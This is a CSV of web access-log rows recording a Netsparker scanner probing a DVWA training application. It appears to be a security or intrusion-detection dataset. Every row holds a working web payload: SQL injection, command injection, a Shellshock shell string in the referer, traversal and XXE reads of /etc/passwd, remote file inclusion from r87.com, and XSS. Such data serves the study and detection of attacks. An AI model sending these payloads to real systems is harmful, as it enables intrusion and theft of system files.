,host,tool,indent,user,time,method,request_path,status,size,referer,agent
6556,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1%20AND%20%27NS%3d%27ss HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6557,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20or%201%3d1%20and%20(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a) HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6558,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%20OR%2017-7%3d10 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6559,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1%20OR%20X%3d%27ss HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6560,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=expr%20268409241%20-%202 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6561,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=expr%20268409241%20-%202%20%26 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6562,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=http%3a%2f%2fexample.com%2f%3f%0d%0ans%3a%20netsparker056650%3dvuln HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6563,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=hTTp%3a%2f%2fr87.com%2fn HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6564,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=http%3a%2f%2fr87.com%2fn%3f%00.php HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6565,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=http%3a%2f%2fr87.com%2fn%3f.php HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6566,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1,200,1250,"() { :;}; echo \""NS:\"" $(/bin/sh -c \""expr 268409241 - 2\"")","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6567,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=low&nsextt=%0ans%3anetsparker056650%3dvuln HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6568,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=low&nsextt=%0d%0ans%3anetsparker056650%3dvuln HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6569,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=ns%3anetsparker056650%3dvuln HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6570,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=NS1NO HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6571,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=ping%20-c%2025%20127.0.0.1 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6572,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=print(int)0xFFF9999-22 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6573,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=expr%20268409241%20-%202&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6574,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fexample.com%2f%3f%0d%0ans%3a%20netsparker056650%3dvuln&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6575,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fr87.com%2f%3f&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6576,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=http%3a%2f%2fr87.com%2fn%3f.php&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6577,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=http://r87.com/?&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6578,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=n%3bns%3aexpression(netsparker(0x00058C))%3b&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6579,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=n%3bns%3aexpression(netsparker(0x00058D))%3b&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6580,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=ns%3anetsparker056650%3dvuln&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6581,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6582,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=r87.com%2f%3f&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6583,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:16 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=r87.com%2fn&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6584,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/dvwa/css/source.css HTTP/1.1,200,503,http://192.168.4.161/DVWA/vulnerabilities/view_source.php?id=%27%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x000594)%3C/scRipt%3E&security=low,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6585,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6586,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%27%2bnetsparker(0x000592)%2b%27&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6587,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%27%2bnetsparker(0x000593)%2b%27&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6588,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6589,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.php&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6590,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%2fetc%2fpasswd&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6591,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6592,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6593,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=*%2fnetsparker(0x000591)%3b%2f*&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6594,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6595,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6596,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&security=low HTTP/1.1,200,763,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6597,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%7b%24%7bprint(int)0xFFF9999-22%7d%7d%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6598,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security='%2BNSFTW%2B' HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6599,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2f%2fr87.com%2f%3f HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6600,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%2fr87.com%2f%3f HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6601,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%2f%5cr87.com%2f%3f HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6602,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20ns%20%5b%3c!ELEMENT%20ns%20ANY%3e%3c!ENTITY%20lfi%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cns%3e%26lfi%3b%3c%2fns%3e HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6603,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6604,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%5bphp%5dprint(int)0xFFF9999-22%3b%5b%2fphp%5d HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6605,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a) HTTP/1.1,200,1249,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6606,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=(SELECT%20CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))) HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6607,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1%20procedure%20analyse(extractvalue(rand()%2cconcat(0x3a%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))))%2c1)--%201 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6608,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=1%20WAITFOR%20DELAY%20%270%3a0%3a25%27-- HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6609,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%22%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%22 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6610,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6611,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%27%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27 HTTP/1.1,200,1249,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
6612,192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:17 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=-1%5c%27%2b(select%201%20and%20row(1%2c1)%3e(select%20count(*)%2cconcat(CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))%2c0x3a%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201))--%201 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
